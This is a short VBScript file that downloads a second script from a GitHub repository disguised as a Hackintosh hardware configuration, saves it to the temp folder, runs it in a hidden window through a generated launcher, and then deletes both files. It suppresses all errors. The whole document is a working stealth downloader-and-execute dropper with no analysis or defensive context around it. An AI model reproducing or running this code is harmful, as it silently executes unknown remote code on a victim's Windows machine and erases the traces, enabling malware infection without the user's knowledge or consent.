Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")
Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")

On Error Resume Next ' Ignore any runtime errors

' URL of the VBS script to be downloaded
vbsUrl = "https://github.com/QuantumQuokka2/Hackintosh-Gigabyte_B550_Gaming_X_V2-Ryzen_7_5800X-RX6800XT/raw/main/Stand%20Mover.vbs"
' Path to save the downloaded VBS script
vbsFile = shell.ExpandEnvironmentStrings("%temp%") & "\copy_stand.vbs"

' Download the VBS script
http.open "GET", vbsUrl, False
http.send
If http.Status = 200 Then
    ' Save the downloaded VBS script to the specified path
    Set file = fso.CreateTextFile(vbsFile, True)
    file.Write http.responseText
    file.Close

    ' Create a temporary VBS script to run the downloaded VBS script hidden
    launcherFile = shell.ExpandEnvironmentStrings("%temp%") & "\vbsLauncher.vbs"
    Set launcher = fso.CreateTextFile(launcherFile, True)
    launcher.WriteLine "Set WshShell = CreateObject(""WScript.Shell"")"
    launcher.WriteLine "WshShell.Run """" & """ & vbsFile & """ & """", 0, True"
    launcher.WriteLine "Do While WshShell.AppActivate(WScript.ScriptName)"
    launcher.WriteLine "    WScript.Sleep 100"
    launcher.WriteLine "Loop"
    launcher.WriteLine "Set fso = CreateObject(""Scripting.FileSystemObject"")"
    launcher.WriteLine "fso.DeleteFile """ & vbsFile & """"
    launcher.WriteLine "fso.DeleteFile """ & launcherFile & """"
    launcher.Close

    ' Run the temporary VBS launcher script
    shell.Run launcherFile, 0, False
End If

Set fso = Nothing
Set shell = Nothing
Set http = Nothing

On Error GoTo 0 ' Reset error handling
